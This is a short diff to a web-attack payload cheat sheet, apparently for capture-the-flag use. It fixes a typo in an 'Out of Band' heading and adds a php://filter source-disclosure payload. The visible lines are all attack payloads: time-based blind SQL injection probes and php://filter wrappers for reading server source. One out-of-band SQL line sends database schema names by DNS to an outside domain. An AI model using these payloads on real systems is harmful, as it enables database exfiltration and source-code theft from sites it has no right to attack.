@@ -1060,7 +1060,7 @@ pop graphic-context
         - `id=87 and if(length(user())>100, sleep(10), 1)=1`
         - `id=87 and if(ascii(mid(user(),1,1))>100, sleep(10), 1)=1`
 
-- Out of Bnad
+- Out of Band
     - Windows only
     - `select load_file(concat("\\\\",schema_name,".dns.kaibro.tw/a")) from information_schema.schemata`
 
@@ -1624,6 +1624,7 @@ HQL injection example (pwn2win 2017)
 - `php://filter/read=string.strip_tags/resource=php://input`
 - `php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=index.php`
 - `php://filter/convert.iconv.UCS-4LE.UCS-4BE/resource=index.php`
+- `php://filter/convert.iconv.utf-16le.utf-8/resource=index.php`
 - ...
 
 ## php://input
